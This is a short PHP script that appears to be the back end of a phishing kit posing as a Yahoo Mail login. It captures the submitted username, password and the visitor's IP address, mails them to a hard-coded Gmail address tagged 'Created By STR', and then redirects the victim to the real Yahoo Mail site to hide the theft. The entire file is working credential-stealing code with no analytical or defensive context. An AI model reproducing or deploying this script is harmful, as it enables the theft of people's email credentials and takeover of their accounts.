<?

$ip = getenv("REMOTE_ADDR");
$message .= "----      -----Created By STR------      ------\n";;
$message .= "Yahoo Mail: ".$_POST['login']."\n";
$message .= "Yahoo Password: ".$_POST['passwd']."\n\n";
$message .= "IP: ".$ip."\n";
$message .= "----      -----Created By STR------      ------\n";



$subject = "STR";
$headers = "From: STR";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail("linkmail398@gmail.com" ,$subject,$message,$headers))
	   {
		   header("Location: http://us.mg5.mail.yahoo.com/neo/launch?reason=ignore&.rand=3ia065s0kj9mu");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>